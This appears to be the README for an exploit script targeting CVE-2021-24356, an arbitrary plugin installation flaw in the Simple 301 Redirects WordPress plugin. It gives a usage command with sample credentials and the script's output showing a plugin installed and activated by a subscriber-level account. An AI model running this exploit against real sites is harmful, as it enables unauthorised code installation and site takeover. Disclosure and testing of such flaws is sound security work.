# CVE-2021-24356
Simple 301 Redirects by BetterLinks - 2.0.0 – 2.0.3 - Subscriber + Arbitrary Plugin Installation

# Description
A lack of capability checks and insufficient nonce check on the AJAX action in the plugin, made it possible for authenticated users to install arbitrary plugins on vulnerable sites. 

How to use
----

```
$ python3 CVE-2021-24356.py --url http://wordpress.lan --username user --password useruser1 --slug betterlinks
Getting REST API Nonce!
Nonce Found: dd72f43027
Installing Plugin!
{"success":true,"data":"Plugin is installed successfully!"}
Activating Plugin!
{"success":true,"data":"BetterLinks is activated!"}
```

Note: Some plugins might not activate if not you need to change sluga variable to the path/file.php that is the main file for the plugin currently works really well when the slug is something like betterlinks and the main file of the plugin is called betterlinks.php
